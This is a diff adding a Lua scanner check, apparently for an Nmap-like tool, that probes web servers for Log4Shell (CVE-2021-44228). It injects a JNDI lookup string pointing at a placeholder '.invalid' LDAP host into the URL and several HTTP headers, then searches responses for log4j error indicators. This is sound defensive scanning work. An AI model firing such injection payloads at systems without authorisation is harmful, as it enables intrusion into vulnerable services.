@@ -1,0 +1,86 @@
+description = "Check for potential Log4Shell exposure via HTTP injection probes (CVE-2021-44228)"
+author = "NetPeek Team"
+license = "MIT"
+categories = {"vuln", "intrusive"}
+portrule_ports = {80, 443, 8080, 8443}
+
+portrule = function(host, port)
+    return port.service == "http" or port.service == "https" or
+           port.number == 80 or port.number == 443 or port.number == 8080 or port.number == 8443
+end
+
+local function scheme_for_port(port)
+    if port.service == "https" or port.number == 443 or port.number == 8443 then
+        return "https"
+    end
+    return "http"
+end
+
+action = function(host, port)
+    local vuln = require "vuln"
+    local marker = "np" .. tostring(port.number) .. "_" .. tostring(string.len(host.ip or ""))
+    local jndi_payload = "${jndi:ldap://" .. marker .. ".netpeek.invalid/a}"
+    local target = string.format("%s:%d", host.ip, port.number)
+    local scheme = scheme_for_port(port)
+    local url = string.format("%s://%s:%d/?q=%s", scheme, host.ip, port.number, jndi_payload)
+
+    local response, err = vuln.http_probe(url, "GET", {
+        timeout_ms = 6000,
+        verify_ssl = false,
+        headers = {
+            ["User-Agent"] = jndi_payload,
+            ["X-Api-Version"] = jndi_payload,
+            ["X-Forwarded-For"] = jndi_payload,
+            ["Referer"] = jndi_payload,
+        }
+    })
+
+    if not response then
+        return vuln.result({
+            check = "http-log4shell",
+            cve = "CVE-2021-44228",
+            vulnerable = false,
+            confidence = "low",
+            severity = "critical",
+            target = target,
+            evidence = "probe_failed:" .. tostring(err or "unknown"),
+            notes = "No response to log4shell probe payload",
+        })
+    end
+
+    local body = string.lower(tostring(response.body or ""))
+    local status = tonumber(response.status or 0) or 0
+
+    local suspicious = false
+    local evidence = {
+        "status=" .. tostring(status),
+    }
+
+    local indicators = {
+        "javax.naming",
+        "jndi",
+        "log4j",
+        "ldap",
+        "lookup",
+    }
+
+    for _, needle in ipairs(indicators) do
+        if string.find(body, needle, 1, true) then
+            suspicious = true
+            table.insert(evidence, "body_contains=" .. needle)
+        end
+    end
+
+    return vuln.result({
+        check = "http-log4shell",
+        cve = "CVE-2021-44228",
+        vulnerable = suspicious,
+        confidence = suspicious and "medium" or "low",
+        severity = "critical",
+        target = target,
+        evidence = table.concat(evidence, ","),
+        notes = suspicious
+            and "Response contains JNDI/log4j error indicators after payload injection"
+            or "No direct callback observed; no strong response-side indicator found",
+    })
+end
